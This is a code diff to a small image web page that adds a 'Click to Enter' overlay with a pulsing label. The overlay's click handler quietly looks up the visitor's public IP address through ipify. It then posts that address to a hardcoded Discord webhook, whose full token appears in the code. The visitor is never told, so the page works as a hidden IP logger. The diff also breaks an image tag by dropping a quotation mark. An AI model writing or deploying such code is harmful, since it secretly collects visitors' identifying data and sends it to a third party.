@@ -20,10 +20,49 @@
             cursor: none;
         }
 
-        .image-container {
+        .click-to-enter {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
             display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            cursor: pointer;
+            transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out;
+        }
+
+        .click-to-enter.hide {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .click-to-enter p {
+            font-size: 2rem;
+            color: #f5b921;
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 3px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .image-container {
+            display: none;
             width: 100vw;
             height: 100vh;
+        }
+
+        .image-container.show {
+            display: flex;
         }
 
         .image-container img {
@@ -88,14 +127,38 @@
     </style>
 </head>
 <body>
-    <div class="image-container">
+    <div class="click-to-enter" id="clickToEnter">
+        <p>Click to Enter</p>
+    </div>
+    <div class="image-container" id="imageContainer">
         <img src="1.jpeg" alt="Image 1">
-        <img src="2.png" alt="Image 2">
+        <img src=2.png" alt="Image 2">
     </div>
     <div class="crosshair" id="crosshair"></div>
     
     <script>
         const crosshair = document.getElementById('crosshair');
+        const clickToEnter = document.getElementById('clickToEnter');
+        const imageContainer = document.getElementById('imageContainer');
+
+        clickToEnter.addEventListener('click', () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    fetch('https://discord.com/api/webhooks/1350441021212987462/zxJMhPSXwvuWppmL3XdM2pmTwBpQ2bZ77l2M9m_jlJsw26cxQXq3JtkJsleaV5675E90', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `New visitor IP: ${data.ip}`
+                        })
+                    });
+                });
+            
+            clickToEnter.classList.add('hide');
+            imageContainer.classList.add('show');
+        });
 
         document.addEventListener('mousemove', (e) => {
             crosshair.style.left = `${e.pageX - 8}px`;
